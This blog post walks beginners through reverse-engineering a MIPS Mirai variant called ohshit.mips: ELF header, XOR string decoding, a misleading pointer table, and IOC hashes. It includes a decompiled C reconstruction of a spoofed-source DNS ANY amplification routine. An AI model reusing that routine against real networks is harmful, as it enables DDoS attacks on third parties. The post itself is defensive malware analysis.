---
title: "Reading Pointers Backwards Since 1985 — A MIPS Mirai Variant Up Close"
date: 2026-06-29
author: "Manuel Boll"
tags: ["Malware-Analysis","Reverse Engineering", "MIPS", "Mirai", "IoT"]
description: "Beginner-friendly walkthrough of a MIPS Mirai/CondiBot variant called ohshit.mips: decoding the single-byte XOR strings, mapping a 21-slot function pointer table that turns out to be mostly unrelated to the C2 attack vocabulary, and tracing how genddos.st ends up as a DNS amplification payload instead of a C2 domain."
image: "/img/posts/ohshit_mips.svg"
images: ["/img/posts/ohshit_mips.png"]
---


MIPS turned forty last year. The R2000 shipped in 1985 with big-endian byte ordering as its native dialect, and the architecture has been stubbornly powering routers, set-top boxes, and security cameras ever since. The downside of all that durability is that whenever a Mirai variant lands on your desk, there is a non-trivial chance you have to read pointers backwards — most significant byte first — and remember that forty-year-old architecture quirks still very much apply.

This is one of those samples. The file is called `ohshit.mips`, which is either an unusually honest gesture from its author or just an accurate label of what is about to happen to whatever embedded device pulls it down. It is 174 KB, statically linked, big-endian MIPS32. The interesting bits are well hidden behind a `.rodata` string table that is "encrypted" with a single-byte XOR (`0x22`) — roughly as much security as putting a sticky note over your password — and behind a function pointer table in `.data` that looks at first glance like an attack-type jump table but turns out to be something else entirely. The actual DDoS handlers (four of them) live in `.text` and are reached through a separate dispatcher.

This post is meant as a **beginner-friendly walkthrough**. The sample is small, the obfuscation is shallow, and almost everything interesting can be discovered by hand in Malcat with two or three keyboard shortcuts. If you have never reversed a MIPS binary before, this is a comfortable place to start: you will touch the ELF header, decode XOR strings, find a function pointer table, and follow a real DDoS handler all the way from the C2 vocabulary to the actual outbound packet. Every step lists the exact hotkeys and addresses, so you can follow along even if you have only ever opened a disassembler once.

The payoff at the end is moderately funny: `genddos.st`, the domain-looking string that everyone latches onto first, is not a C2 endpoint. It is a payload.

- - -

1\. What's in the Box
---------------------

Drop the file into Malcat and let it digest. Once the analyzer is done you get the basic shape of the binary at a glance.

![Malcat overview after loading ohshit.mips](/img/posts/ohshit/01_malcat_overview.png)

The summary panel gives you:

```
File Type:    ELF 32-bit MSB executable
Architecture: MIPS32 (Big Endian)
Size:         174,032 bytes
Entry Point:  0x00400260
```

MSB = Most Significant Byte first = big endian. MIPS likes it that way, which is convenient if you grew up reading hex from left to right and inconvenient the moment you have to mentally swap bytes back into x86 order. Worth getting comfortable with now, because every multi-byte read for the rest of this analysis lives in that ordering.

The hashes, for your IOC list:

```
SHA256: f9ec1b33dfc61dad616223f2eef5a80d3b9b9165e9035b574eb436b34a78ee8e
MD5:    f46d6f12245effbc5162c077ee1203b9
SHA1:   da7910d7cd36c83e0da9434fd6f0f814f243af9e
```

Malcat will also tell you that the binary is **statically linked**. Translation: every libc function the malware needs — `socket`, `connect`, `send`, `memset`, the lot — is baked into the binary. There is no Imports tab to lean on. You will not see a list of function names that immediately reveals what each block of code does. Every function is a `sub_XXXXXX` until you reverse it. That same property has a second consequence we will come back to in section nine, when the function pointer table we find in `.data` turns out to be mostly unrelated to the C2 attack vocabulary.

- - -

2\. Entry Point, CRT0, and the Search for main
----------------------------------------------

Hit `F2` for the hex view, jump to file offset 0 with `Ctrl+G` → `#0`, and look at the first sixteen bytes:

```
7F 45 4C 46 01 02 01 00 00 00 00 00 00 00 00 00
```

That is the ELF identification header. Byte by byte:

- `7F 45 4C 46` — magic number `\x7FELF`
- `01` — 32-bit (`02` would be 64-bit)
- `02` — big endian (`01` would be little endian)
- `01` — version
- `00..` — padding

The entry point lives at file offset `#0x18`:

```
00 40 02 60
```

Read as a big-endian 32-bit integer: `0x00400260`. That is the virtual address the kernel jumps to when the binary starts. Hit `Ctrl+G` again, type `400260` without the `#` (that tells Malcat to treat it as a VA rather than a file offset), and switch to disassembly with `F3`.

![CRT0 startup stub at the entry point](/img/posts/ohshit/02_entry_point.png)

What you are looking at is the CRT0 startup stub:

```mips
00400260  move   $zero, $ra
00400264  bal    .1
00400268  nop
0040026c  lui    $gp, 0x7
00400270  addiu  $gp, $gp, 0x1D64
00400274  addu   $gp, $gp, $ra
...
00400294  lw     $a3, [$gp-0x7BEC]      ; ->  _init
00400298  lw     $t0, [$gp-0x7D94]      ; ->  _fini
...
004002ac  lw     $t9, [$gp-0x7D18]      ; ->  __libc_start_main
004002b4  jalr   $t9
```

This is standard libc plumbing. It sets up `$gp` (global pointer) the MIPS way, loads pointers to `_init`, `_fini`, and a `main` function into the argument registers, then jumps to `__libc_start_main` which in turn calls `main`. We do not need to read every instruction here. What we care about is: there is a `main` somewhere, and the GOT entry being loaded at `004002ac` minus a small offset gives us a reasonable cross-reference to find it later. For now, it lives at `sub_411968` — we will meet it again in section seven.

- - -

3\. The Sections That Actually Matter
-------------------------------------

Switch to the Structures view (tab dropdown, top right) and look at the section table. Five sections are worth committing to muscle memory for the rest of this analysis:

| Section  | VA Start    | File Offset | Size      | Rights | Notes                              |
|----------|-------------|-------------|-----------|--------|------------------------------------|
| `.text`  | 0x00400120  | 0x00000120  | 137,584 B | RX     | All code                           |
| `.rodata`| 0x00421AF0  | 0x00021AF0  | 31,536 B  | R      | Read-only constants, including the XOR-encrypted strings |
| `.data`  | 0x00469B90  | 0x00029B90  | 1,104 B   | RW     | Initialized data, including the function pointer table   |
| `.got`   | 0x00469FE0  | 0x00029FE0  | 1,372 B   | RW     | Global Offset Table                |
| `.bss`   | 0x0046A560  | —           | 9,528 B   | RW     | Uninitialized, allocated in RAM    |

`.rodata` is usually a goldmine — IP literals, C2 hosts, command names, HTTP headers all tend to land here. In Mirai variants they are also reliably obfuscated, because if the C2 host were sitting there in plaintext it would land in every YARA rule on the planet within a day of the sample showing up on VirusTotal.

- - -

4\. The Strings That Aren't There
---------------------------------

Press `F6` for the Strings view and scroll. You will see HTTP User-Agents, a few mundane bits of libc text, and nothing that looks like attack vocabulary. No IPs, no domains, no `ATTACK`, no `KILL`, no `/proc/anything`. The interesting strings exist; they are just not legible yet.

Hop back to hex, jump to file offset `#0x21AF0` (start of `.rodata`), and scroll until something looks deliberately wrong. Around `#0x27590` (VA `0x00427590`) you find a stretch of bytes that has structure but no readable content:

![Encrypted .rodata bytes around 0x27590](/img/posts/ohshit/03_rodata_encrypted.png)

A typical run looks like this:

```
45 47 4C 46 46 4D 51 0C 51 56 22
```

What jumps out is the trailing `22`. C strings are null-terminated; they end in `0x00`. If somebody XOR'd every byte of a C string with a constant `K`, the terminator becomes `0x00 ^ K = K`. So if every "string" in `.rodata` ends in the same byte, that byte is your key. Here it is `0x22`.

Try it on the run above:

```
45 ^ 22 = 67 ('g')
47 ^ 22 = 65 ('e')
4C ^ 22 = 6E ('n')
46 ^ 22 = 64 ('d')
46 ^ 22 = 64 ('d')
4D ^ 22 = 6F ('o')
51 ^ 22 = 73 ('s')
0C ^ 22 = 2E ('.')
51 ^ 22 = 73 ('s')
56 ^ 22 = 74 ('t')
22 ^ 22 = 00 ('\0')
```

`genddos.st`. That is the family marker of this variant. State-of-the-art obfuscation it is not, but for a sample that only has to defeat `strings(1)` and lazy YARA rules, one XOR byte is apparently enough.

- - -

5\. Dumping the Whole String Table
----------------------------------

Once you have the key, Malcat takes care of the rest. Highlight a generous chunk of `.rodata` starting at the obfuscated table — a couple of thousand bytes will do — right-click → Transforms → XOR, key `22`, preview the result.

![XOR transform dialog in Malcat](/img/posts/ohshit/04_xor_transform.png)

The decoded view is the entire personality of the malware laid out in clear:

![Decoded .rodata after applying XOR 0x22](/img/posts/ohshit/05_rodata_decoded.png)

The grouping looks roughly like this:

```
genddos.st                       <- variant marker, also a payload (see section 10)
Bruh why again                   <- author's editorial voice

qtxbot                           <- rival botnets to evict from the host
hakai
dvrHelper
NiGGeR69xd
1337SoraLOADER
GhostWuzHere666

PRIVMSG                          <- IRC-shaped C2 commands
GETLOCALIP
KILLATTK

/proc/                           <- system probing
/proc/net/tcp
/proc/cpuinfo
/dev/watchdog                    <- silence the watchdog so the device cannot reboot
/dev/misc/watchdog
/etc/rc.d/rc.local               <- persistence

arc, arm, arm5, arm6, arm7,      <- arch list for the dropper to pull the right build
x86, x86_64, mips, mpsl, ppc, sh4

Connection: keep-alive           <- HTTP layer-7 attack headers
Accept-Language: en-US,en;q=0.8
server: dosarrest
server: cloudflare-nginx
```

A few observations:

- The kill list contains six rival botnet names. The IoT real estate market is, evidently, quite competitive.
- `/dev/watchdog` and `/etc/rc.d/rc.local` are present as strings. Mirai-family code typically silences the watchdog and writes itself into `rc.local` for persistence, but the actual code paths that do this are not analysed in this walkthrough — only that the strings exist is established here.
- `Bruh why again` sits in the binary verbatim. Whoever wrote this had thoughts about their own code.

- - -

6\. Where the Decoder Lives
---------------------------

Strings being XOR-encrypted means something in the code has to decode them at runtime. Malcat's Summary tab has an "Anomalies" panel that flags exactly the kind of pattern we are looking for — a function with a tight loop full of XORs.

![Anomalies panel showing XorInLoop hits](/img/posts/ohshit/06_xorinloop_anomaly.png)

Picking one of those entries and hitting `F4` for the decompiler view gets you the actual logic. Malcat's raw output is harder to read than it should be — it groups the byte loads from MIPS `lbu`/`sb` instructions in ways that look like the same byte is being XOR'd four times in a row, which would be a no-op. Cleaned up by hand, the function is doing this:

```c
// In-place XOR decoder. Index points into the string table at 0x46a3cc;
// each table entry is 8 bytes: (heap pointer, length).
void xor_decode_string(uint32_t index) {
    uint32_t *entry  = (uint32_t*)((index & 0xff) * 8 + 0x46a3cc);
    uint32_t  key32  = *(uint32_t*)0x46a314;   // value: 0x22222222
    uint8_t   key    = key32 & 0xff;           // every byte of key32 is 0x22
    char     *s      = (char*)entry[0];
    uint32_t  length = entry[1];

    for (uint32_t i = 0; i < length; i++) {
        s[i] ^= key;
    }
}
```

The key is loaded as a 32-bit word from the global at `0x46a314`. That word holds `0x22222222`, which is just the byte `0x22` repeated four times — the same byte we already pulled out of the null-terminator trick.

There is also a sibling function, `sub_4139e4`, which behaves the same way. The `0x46a3cc` table it references is where this gets interesting.

- - -

7\. The String Table Is on the Heap
-----------------------------------

The XOR-encrypted bytes never get decoded in place inside `.rodata`. The binary keeps `.rodata` read-only and copies each string into the heap before doing anything with it. The function responsible for that copy is `sub_413ac8`, and it gets called exactly once from `main` (`sub_411968`).

![Decompiled sub_413ac8 — one heap allocation and one memcpy per string entry, repeated for the full table](/img/posts/ohshit/07_string_table_init.png)

The full decompilation is several hundred lines of the same pattern. Trimmed down:

```c
void sub_413ac8(void) {                       // string table init
    void     *string_ptr;
    uint32_t *table = 0x46a3cc;               // global string table

    // String #0: genddos.st (11 bytes)
    string_ptr = malloc(0xb);
    memcpy(string_ptr, 0x469ff4 + 0x7590, 0xb);
    *(table + 2) = string_ptr;
    *(table + 3) = 0xb;

    // String #1: "st" (2 bytes)
    string_ptr = malloc(2);
    memcpy(string_ptr, 0x469ff4 + 0x759c, 2);
    *(table + 4) = string_ptr;
    *(table + 5) = 2;

    // ... roughly 90 strings total
}
```

Each entry in the table is an `(8-byte pair)` of `(heap_pointer, length)`. `genddos.st` is string `#0`. Whenever the code needs it, it goes:

```c
uint32_t len;
char *s = sub_4138cc(0, &len);   // getter: returns pointer + length
sub_4139e4(0);                   // in-place XOR decode using key 0x22
// s now points at "genddos.st\0"
```

There are two practical implications. First, decoded strings are never written back into `.rodata`, so a memory dump of the running process will show plaintext on the heap and ciphertext on the read-only segment — useful to know if you ever need to spot this thing in a forensic image. Second, every consumer of these strings goes through the same getter, which gives you a clean cross-reference target: find everyone who calls `sub_4138cc` or `sub_4139e4` and you have a complete list of code that touches the string table. That cross-reference is how we will find the actual users in section ten.

- - -

8\. Finding the Function Pointer Table
--------------------------------------

The C2 protocol talks in attack-type IDs. A command from the C2 looks roughly like:

```
ATTACK <type_id> <target_ip> <port> <duration> <flags>
```

`type_id` indexes into a function pointer table. The dispatcher looks it up and calls the corresponding handler. To know what this thing is actually capable of, you have to find that table.

Three constraints narrow the search:

- Initialized writable data lives in `.data` or `.got`.
- This is 32-bit MIPS, so each pointer is 4 bytes.
- The pointers target `.text`, which means their virtual addresses fall between `0x00400120` and `0x00421A90` — i.e. they all start with `00 4X`.

Jump to `.data` (`Ctrl+G` → `#0x29B90`) and scroll until something fits.

![Function pointer table in .data around #0x2A3B4](/img/posts/ohshit/08_pointer_table.png)

Around offset `#0x2A3B4` you find this:

```
0002A3B0  00 00 00 00 00 40 C9 CC 00 41 CA D4 00 46 A5 88
0002A3C0  00 41 B1 80 00 41 D6 70 00 41 AF 28 00 46 C6 A0
0002A3D0  00 41 32 7C 00 41 A8 50 00 42 03 A0 00 40 BC 28
0002A3E0  00 41 BB E0 00 40 00 94 00 00 00 00 00 41 D5 00
0002A3F0  00 41 92 50 00 41 DA B0 00 41 EC 18 00 41 62 C0
0002A400  00 40 E9 08 00 41 AB 90
```

Ignore the ASCII column entirely. Pointers are not text. The `@`, `A`, `B` characters in that ASCII rendering are numeric values that happen to coincide with printable letters. What you are looking for in the hex panel is **shape**: 4-byte chunks where every chunk starts with `00 4X`. That is the table.

Decode the first one to prove the principle:

```
Bytes:      00 40 C9 CC
Big endian: 0x0040C9CC
File offset: 0x0040C9CC - 0x00400000 = 0x0000C9CC  → inside .text
```

Repeat for the next twenty entries. You end up with twenty-one virtual addresses, which is where the analysis takes a turn.

- - -

9\. The Twenty-One-Slot Red Herring
-----------------------------------

If you assume every entry in this table is an attack handler, you immediately notice a few problems. `0x0046A588` sits inside `.got`, not `.text`. `0x00000000` is obviously a NULL. `0x00400094` is below the start of `.text` (which begins at `0x00400120`) — it lands in the ELF headers, not in code. Those cannot all be handlers.

Walking the rest of the pointers — decode the bytes, `Ctrl+G` to the address, `F4` for the decompiler, look at what is there — leaves you with a partial classification. Some entries land on functions we can identify; most of the rest land somewhere inside `.text` but the specific role of each is beyond the scope of this walkthrough.

| Pos | VA          | What it is                                                          |
|-----|-------------|---------------------------------------------------------------------|
| 0   | 0x0040C9CC  | **UDP Generic Flood** (real DDoS handler — `SOCK_DGRAM`, no spoofing)|
| 1   | 0x0041CAD4  | inside `.text` — role unconfirmed                                   |
| 2   | 0x0046A588  | invalid — sits in `.got`, not `.text`                               |
| 3   | 0x0041B180  | inside `.text` — role unconfirmed                                   |
| 4   | 0x0041D670  | inside `.text` — role unconfirmed                                   |
| 5   | 0x0041AF28  | utility — bitmap set-bit                                            |
| 6   | 0x0046C6A0  | invalid — outside `.text`                                           |
| 7   | 0x0041327C  | inside `.text` — role unconfirmed                                   |
| 8   | 0x0041A850  | inside `.text` — role unconfirmed                                   |
| 9   | 0x004203A0  | inside `.text` — role unconfirmed                                   |
| 10  | 0x0040BC28  | **DNS Amplification** (real DDoS handler — `SOCK_RAW`, spoofed source) |
| 11  | 0x0041BBE0  | inside `.text` — role unconfirmed                                   |
| 12  | 0x00400094  | invalid — below `.text` start, lands in ELF headers                 |
| 13  | 0x00000000  | NULL — never wired up                                               |
| 14  | 0x0041D500  | inside `.text` — role unconfirmed                                   |
| 15  | 0x00419250  | inside `.text` — role unconfirmed                                   |
| 16  | 0x0041DAB0  | inside `.text` — role unconfirmed                                   |
| 17  | 0x0041EC18  | libc `scanf` (statically linked)                                    |
| 18  | 0x004162C0  | inside `.text` — role unconfirmed                                   |
| 19  | 0x0040E908  | inside `.text` — role unconfirmed                                   |
| 20  | 0x0041AB90  | inside `.text` — role unconfirmed                                   |

So out of twenty-one slots:

- **Two** are real DDoS handlers (positions 0 and 10).
- **Four** are invalid or NULL (positions 2, 6, 12, 13).
- **Two** could be identified positively (the bitmap utility at position 5 and a statically-linked `scanf` at position 17).
- **Thirteen** point into `.text` but going through each one individually would turn this walkthrough into a different kind of post.

That is enough to draw the relevant conclusion: this is not the C2's attack-handler table. The binary is statically linked, the compiler emits function pointer tables for plenty of reasons that have nothing to do with malware (vtables, callback registrations, signal handlers, static initialisers), and we have stumbled into one of those. The fact that two attack handlers also live here is the kind of coincidence that comes from "the linker puts things where it wants to put things."

The other two real DDoS handlers live elsewhere in `.text` entirely and are **not** in this table: `0x0040C2FC` (TCP SYN/ACK Flood, `SOCK_RAW`, spoofed source) and `0x00406B84` (HTTP POST Flood, `SOCK_STREAM`, rotates through twelve User-Agent strings). Finding *those* the same way we found the DNS handler — by following cross-references off the string getter `sub_4138cc` — is left as a follow-up exercise; section ten covers one of them in detail and the others mirror its structure.

- - -

10\. The genddos.st Punchline
-----------------------------

`genddos.st` looks like a C2 domain. It has the shape of one, lands at index 0 in the string table, gets pulled into the heap on startup. If you stop there, you write it down as a C2 indicator and move on. That would be wrong.

Cross-reference `sub_4138cc` (the getter) and `sub_4139e4` (the in-place decoder) and you find a small set of common callers. One is `main` itself, calling the string table init at startup. The rest are functions that pull individual strings out of the table when they need them — including the function this section is about.

![Callers of the string-table getter sub_4138cc — main plus a handful of consumers, one of which is sub_40f250](/img/posts/ohshit/09_string_getter_callers.png)

The interesting one in that list is `sub_40F250` — a long function (~500 lines) that turns out to be the place where `genddos.st` actually gets used. What it does, in cleaned-up form:

```c
void sub_40f250_dns_flood(uint32_t count, target_t *targets, ...) {
    int   sock;
    char *hostname;
    uint32_t hostname_len;
    char  dns_query[512];
    char  ip_packet[1500];

    // 1. Pull "genddos.st" out of the string table
    hostname = sub_4138cc(0, &hostname_len);
    sub_4139e4(0);                            // in-place XOR decode

    // 2. Raw socket so we can forge the source IP
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);

    // 3. Build a DNS ANY query for "genddos.st"
    memset(dns_query, 0, sizeof(dns_query));
    *(uint16_t*)(dns_query + 0) = rand();
    *(uint16_t*)(dns_query + 2) = htons(0x0100);          // standard query
    *(uint16_t*)(dns_query + 4) = htons(1);               // 1 question
    int offset = 12;
    encode_dns_name(dns_query + offset, hostname);        // "\x07genddos\x02st\x00"
    offset += strlen_dns_encoded(hostname);
    *(uint16_t*)(dns_query + offset + 0) = htons(255);    // type ANY
    *(uint16_t*)(dns_query + offset + 2) = htons(1);      // class IN

    // 4. For each victim, build an IP packet whose SOURCE is the victim
    for (int i = 0; i < count; i++) {
        target_t *t = &targets[i];

        ip_packet[0] = 0x45;                              // IPv4, IHL 5
        *(uint32_t*)(ip_packet + 12) = t->victim_ip;      // SOURCE = victim
        *(uint32_t*)(ip_packet + 16) = t->dns_server;     // DEST = DNS resolver
        *(uint16_t*)(ip_packet + 20) = htons(rand());
        *(uint16_t*)(ip_packet + 22) = htons(53);
        memcpy(ip_packet + 28, dns_query, query_len);

        ip_checksum(ip_packet);
        udp_checksum(ip_packet);

        sendto(sock, ip_packet, query_len + 28, 0,
               &dns_server_addr, sizeof(dns_server_addr));
    }
}
```

`genddos.st` is not a C2 endpoint. It is a **payload** — the domain name the bot stuffs into a spoofed DNS ANY query so that some upstream resolver answers a large response (NXDOMAIN with SOA records, typically 3 KB) to the spoofed source, which is the victim's IP. Classic DNS reflection/amplification, about 47× volume gain on a 64-byte query.

This is what a DNS ANY amplification attack looks like from the resolver's side. The log lines below are not from running this sample — they are from an unrelated incident captured on an exposed recursive resolver, included here only to illustrate the pattern:

![Example DNS server log from an unrelated DNS ANY amplification attack — same mechanic as what ohshit.mips generates, different query name](/img/posts/ohshit/10_dns_amp_logs.png)

Every line is a DNS query coming in with a domain (`2ler.org` in this example) as the question name and a fixed client IP `146.56.180.42` as the supposed source. The actual sender — the infected device — never appears in the logs at all. The DNS server has no reason to suspect the source is forged, dutifully answers, and the answer goes to `146.56.180.42`. From the victim's perspective you are being hit by a stranger DNS server you never asked anything from. From the resolver's perspective you are being abused as an amplifier and never quite notice. The `ohshit.mips` sample produces exactly this traffic shape; the only thing different in its own run would be the query name, which the disassembly says is `genddos.st`.

So if you find `genddos.st` in your environment as a DNS query name, the relevant question is not "is my user trying to reach this domain". It is "is this device's source IP being forged by something locally, and is that something an IoT bot."

- - -

11\. What This Sample Actually Is
---------------------------------

Pulling everything together, here is what is **directly verified** by this walkthrough versus what is only **suggested** by strings:

Verified:

- **Target.** MIPS32 big-endian, statically linked — fits the routers-and-set-top-boxes profile (ELF header).
- **Obfuscation.** Single-byte XOR with key `0x22` on all `.rodata` strings. Decoder at `sub_4139e4`/`sub_413900`; key loaded from the global at `0x46a314` (`0x22222222`).
- **String table.** Initialised once at startup by `sub_413ac8` (called from `main` = `sub_411968`). Each entry is `(heap pointer, length)`. `genddos.st` is index 0.
- **Attack capability.** Four real DDoS handlers identified by the broader analysis — UDP Generic (`0x0040C9CC`), TCP SYN/ACK (`0x0040C2FC`), DNS Amplification (`0x0040BC28`), HTTP POST (`0x00406B84`). Two of them (UDP, DNS) happen to be referenced from the `.data` pointer table at positions 0 and 10; the other two are reached via the dispatcher but not via that table.
- **Amplification.** ~47× via spoofed-source DNS ANY queries built around `genddos.st`. `genddos.st` is **not** a C2 endpoint — it is the question name in the amplification payload.

Suggested by strings only (not verified in this walkthrough):

- **Persistence.** `/etc/rc.d/rc.local` is present in `.rodata`. Mirai-family code commonly writes itself into `rc.local`, but the code path that does this here is not analysed in this post.
- **Self-defense — watchdog.** `/dev/watchdog` and `/dev/misc/watchdog` are present in `.rodata`. The expected behaviour is silencing the kernel watchdog so the device cannot reboot itself out of the infection, but this is again strings only.
- **Self-defense — rival eviction.** Names of six rival botnets are present in `.rodata` (`qtxbot`, `hakai`, `dvrHelper`, `NiGGeR69xd`, `1337SoraLOADER`, `GhostWuzHere666`). The expected behaviour is process-killing, but the matching code is not walked here.
- **C2 protocol shape.** The strings `PRIVMSG`, `GETLOCALIP`, `KILLATTK` suggest an IRC-style command vocabulary, but the actual networking and parser are not analysed here.
- **Family marker.** `genddos.st` is the obvious one. The author's own line `Bruh why again` sits next to it in `.rodata`.

Reverse engineering on MIPS in 2026 looks essentially the same as it did when the architecture was new in the mid eighties. Pointers are still big-endian. Function pointer tables still get generated by the linker for reasons unrelated to whatever the malware is trying to do, which is good for paranoia and bad for first impressions. The hard part is not the cryptography — there isn't any — it is being patient enough to walk every pointer and confirm what is on the other end. If you do that work, what is left is not particularly sophisticated. It is just thorough enough to be annoying.

- - -

Hashes for IOC tables are at the top of the post. If you see any of them in your environment, that is the same binary, and somewhere a router is having a very bad week.
